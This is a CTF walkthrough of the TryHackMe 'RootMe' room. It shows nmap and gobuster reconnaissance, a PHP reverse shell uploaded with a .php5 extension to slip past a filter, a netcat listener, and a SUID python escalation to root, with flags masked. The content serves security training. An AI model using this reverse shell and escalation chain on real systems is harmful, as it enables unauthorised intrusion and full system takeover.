<!-- TOC -->

- [RootMe](#rootme)
    - [Reconnaissance](#reconnaissance)
    - [Getting a shell](#getting-a-shell)
    - [Privilege escalation](#privilege-escalation)

<!-- /TOC -->

# RootMe

[RootMe Room](https://tryhackme.com/room/rrootme)

A ctf for beginners, can you root me?

| Title | IP Address |
| :---- | :---- |
| RootMe | `1*.**.***.***` |

## Reconnaissance

```bash
sudo nmap -A -vv -T4 -oA initial 1*.**.***.*** 
```

> `22/tcp open *** syn-ack ttl 61 O***SSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`

> `80/tcp open **** syn-ack ttl 61 A***** httpd 2.*.** ((Ubuntu))`

```bash
gobuster dir -u 1*.**.***.***:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,css,htm,html,js,php,py -t 100
```

> ```
> /u******              (Status: 301) [Size: 316] [--> http://1*.**.***.***/u******/]
> /index.php            (Status: 200) [Size: 616]                                    
> /css                  (Status: 301) [Size: 312] [--> http://1*.**.***.***/css/]    
> /js                   (Status: 301) [Size: 311] [--> http://1*.**.***.***/js/]     
> /p****                (Status: 301) [Size: 314] [--> http://1*.**.***.***/p****/]  
> /server-status        (Status: 403) [Size: 278]
> ```

## Getting a shell

Using the famous __pentestmonkey's PHP reverse shell__

Copy and modify `/usr/share/webshells/php/php-reverse-shell.php`

```php
// php-reverse-shell.php5
$ip = '1*.*.**.**';  // CHANGE THIS
$port = 80;       // CHANGE THIS
```

```bash
mv php-reverse-shell.php php-reverse-shell.php5
```

Upload to: `http://1*.**.***.***/p****/`

```bash
nc -lvnp 80
```

Go to: `http://1*.**.***.***/u******/php-reverse-shell.php5`

RHOST:

```bash
find / -type f -name user.txt 2>/dev/null
```

> `/***/***/user.txt`

```bash
cat /***/***/user.txt
```

> `THM{***_***_*_*****}`

## Privilege escalation

```bash
find / -perm -4000 2>/dev/null
```

> `/***/***/******`

Using [GTFOBins](https://gtfobins.github.io):

```bash
p***** -c 'import os; os.execl("/bin/sh", "sh", "-p")'
find / -type f -name root.txt
```

> `/****/root.txt`

```bash
cat /****/root.txt
```

> `THM{*********_**********}`
